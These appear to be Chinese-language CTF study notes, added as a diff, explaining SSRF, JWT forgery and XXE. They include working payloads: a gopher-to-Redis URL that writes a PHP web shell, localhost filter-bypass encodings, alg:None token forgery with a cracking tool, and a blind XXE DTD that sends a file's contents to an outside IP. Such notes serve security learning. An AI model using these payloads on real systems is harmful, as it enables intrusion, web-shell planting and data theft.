@@ -1,0 +1,383 @@
+
+SSRF 
+
+Server-side Request Forgery 服务端请求伪造
+
+攻击者向服务端发送包含恶意url连接的请求，借由服务端发起请求
+
+以便获取服务端网络内部的资源
+
+
+一句话总结：
+控制服务端使用指定协议访问指定的url
+
+
+
+
+A：你为什么这么干？
+
+B：是谁谁谁让我干的
+
+A：谁谁谁让你去吃shi你去不去？
+
+
+特点：
+
+1 让别人访问我们访问不到的url
+2 拿到自己本来拿不到的数据
+
+
+条件：
+
+1 别人能帮我访问url 服务端有接受url地址并进行访问的功能
+2 url地址外部可控
+
+
+https://xxx.com/index.php?url=http://www.baidu.com
+
+
+<?php
+
+$url = $_GET['url'];
+
+header('location:'.$url); //302的跳转
+
+?>
+
+是不是属于ssrf?
+
+告诉浏览器，你去访问这个地址 
+
+此时，浏览器，是客户端还是服务端？
+
+
+客户端   
+
+此时，服务器没有访问这个Url,只是告诉你浏览器，去跳转到这个地址去
+
+
+是浏览器去访问，不是服务端去访问
+
+所以，不是SSRF
+
+只能算 任意跳转漏洞
+
+
+分清  是否是ssrf？
+
+url地址可控
+
+
+http://10.xx.xx.xx/
+
+file:///etc/passwd
+
+URL格式
+
+URI = scheme:[//authority]path[?query][#fragment]
+
+schema: 协议头
+://
+
+authority 
+[userinfo@]host[:port]
+
+默认使用80端口，而80端口默认情况下，是可以省略
+
+http://www.baidu.com/robots.txt
+
+本质，就是 通过指定的协议，访问互联网上某台服务器的某个资源或者某个文件
+
+默认使用匿名账户访问
+userinfo: username:password@host
+
+
+schema://username:password@host:port/path?a=b#top
+
+http://ctfshow:hacker@www.baidu.com/robots.txt
+
+
+SSRF的利用面
+
+
+1 任意文件读取 前提是知道要读取的文件名
+
+2 探测内网资源
+
+ 127.0.0.1 mysql服务端监听了127.0.0.1这个地址，也就表示，只能通过127.0.0.1这个IP来访问
+
+ 0.0.0.0 表示允许任意ip访问
+
+ 192.168.233.233 只允许特定的IP地址访问
+
+
+ 3 使用gopher协议扩展我们的攻击面
+
+ apache/nginx 80
+ tomcat 8080
+ node 3000
+ flask 8080
+ php-fpm 9000
+ mysql 3306
+ ftp 21
+ ssh 22
+ redis 6379
+
+ key-value  gopher://127.0.0.1:6379/_save_/var/www/html/1.php_<?php eval($_POST[1]);?>
+
+ mysql 3306
+
+ 用户密码为空 
+
+ php-fpm
+
+ php-fpm 默认监听9000端口，而且只允许本机127.0.0.1这个地址访问
+
+ 主要负责对.php文件的代码解释执行  
+
+ 我们可以通过向9000端口发送格式的请求，来让9000端口背后的php-fpm帮我们处理我们提交的php代码
+
+ 通过向9000端口发送php执行请求
+
+ 设置php.ini中的运行参数
+
+ 其中使用 auto_append_file 来指定 php://input 包含恶意代码，然后执行
+
+ 为了能使用auto_append_file参数，必须有一个存在的php文件来使用这个配置项
+
+
+ php原生类进行ssrf
+
+$soap = new SoapClient($_GET['url']);
+
+$soap->hack();
+
+//$soap->__call()
+
+url可控时，可以发送内网请求
+
+ssrf绕过
+
+只要不允许它访问本地地址即可，也就是说，过滤的目的是，不让访问127.0.0.1地址
+
+1 enclosed alphanumerics 绕过
+
+127.0.0.1
+
+127.⓿.⓿.1
+
+2 使用IP地址转换
+
+所有的域名->IP  
+
+ip可以使用不同进制来表示 
+
+127.0.0.1用不同进制可以表示为
+- 2130706433  10进制 http://2130706433  
+- 017700000001 8进制 http://017700000001 
+- 7F000001 16进制   http://0x7F000001 
+
+
+3 特殊语法绕过
+
+Windows 下 0 代表的是0.0.0.0 
+而Linux 下 0 代表的是127.0.0.1
+
+127.0.0.1 可以省略为 127.1
+
+127。0。0。1 可以替代127.0.0.1
+
+
+4 如果对方可以接受302跳转，并且跟进302跳转
+
+可以发送http的协议。但是返回的location为其他协议
+
+http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&payload=xxxx
+
+5 利用短网址绕过
+
+baidu.com  不允许出现baidu
+
+或者限制了url长度，我们可以切换为短网址，来绕过长度的限制
+
+http://rurl.vip/eW7AU
+
+
+JWT
+
+jwt是一个轻量级的认证规范 对数据进行签名用的
+
+防止数据被篡改
+
+1 对数据进行加密   内容对用户敏感，不需要对外
+2 对数据进行签名   内容不敏感，但是确保不被篡改
+
+JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取
+
+JSON Web Token JWT 
+
+?username=admin&score=100  别人传递过程中，会对积分进行篡改 
+
+?username=admin&score=100&token=c17961f5f372f8cf039113909d715943
+
+? md5(score=100&username=admin)=c17961f5f372f8cf039113909d715943
+
+?score=100&username=admin&token=c17961f5f372f8cf039113909d715943
+
+篡改数据的同时，破解了算法，篡改了签名
+
+加盐机制，salt
+
+md5(score=100&username=admin_ctfshow)=20f3fa445b286df3f1a518fcbcd8bbe2
+
+盐值有可能被爆破，也有可能被泄露
+
+增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现
+
+
+
+漏洞点
+
+1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的
+
+{
+    "alg" : "None",
+    "typ" : "jwt"
+}
+{
+    "user" : "Admin"
+}
+
+没有加密算法时采用的是base64编码
+{"alg":"None","typ":"JWT"}
+{"iss":"admin","iat":1673703091,"exp":1673710291,"nbf":1673703091,"sub":"admin","jti":"21a3d6eec9efbc030983fbc3650c0f03"}
+
+ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9
+
+
+JWT 爆破工具地址
+
+https://github.com/brendan-rius/c-jwt-cracker
+
+docker build . -t jwtcrack
+
+
+docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
+
+
+node安装jwt命令
+
+npm install jsonwebtoken
+
+1 私钥泄露
+
+可以根据私钥生成任意的jwt字符串
+
+
+const jwt = require('jsonwebtoken');
+const fs = require('fs');
+
+var privateKey = fs.readFileSync('private.key');
+
+var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });
+console.log(token)
+验签
+
+
+2 公钥泄露
+
+可以根据公钥，修改算法从非对称算法 到 对称密钥算法  
+
+双方都使用公钥验签，顺利篡改数据
+
+当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密
+
+实现验签通过
+
+
+总结加密方式
+
+1 非对称加密算法  私钥  公钥   只要两个时匹配 一个私钥加密的文件，用公钥都能解开(验签)
+
+
+2 对称加密算法   暗号  口令  公钥 
+
+总结jwt攻击
+
+1 空密码算法绕过 不验证算法的前提下
+
+2 弱密码绕过   猜测弱密码
+
+3 密码爆破   安装docker 执行jwtcracker
+
+4 私钥泄露  直接利用私钥生成正确jwt字符串 过验签
+
+5 公钥泄露  不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串 实现验签通过
+
+
+xxe的利用
+
+
+XML Entity 实体注入
+
+当程序处理xml文件时，没有禁止对外部实体的处理，容易造成xxe漏洞
+
+危害
+
+主流是任意文件读取
+
+XML 文件
+
+一般表示带有结构的数据
+
+祖父  3个叔父  8个堂弟堂妹   
+
+<祖父>
+
+    <叔父1>
+        <堂兄1>
+    </叔父1>
+
+    <叔父2>
+     <堂兄2>    
+    </叔父2>
+
+    <叔父3>
+
+     <堂兄3>
+    </叔父4>
+
+</祖父>
+
+xml格式
+
+
+1 有回显时文件读取方法
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE hacker[
+    <!ENTITY hacker SYSTEM "file:///flag">
+]> 
+
+<root>
+    <ctfshow>
+        &hacker;
+    </ctfshow>
+</root>
+
+2 无回显时文件读取方法
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE hacker[
+    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+    <!ENTITY  % myurl SYSTEM "http://49.232.215.127/test.dtd">
+    %myurl;
+]> 
+<root>
+1
+</root>
+
+test.dtd内容
+
+<!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://49.232.215.127:7500/%file;'> ">
+%dtd;
+%vps;
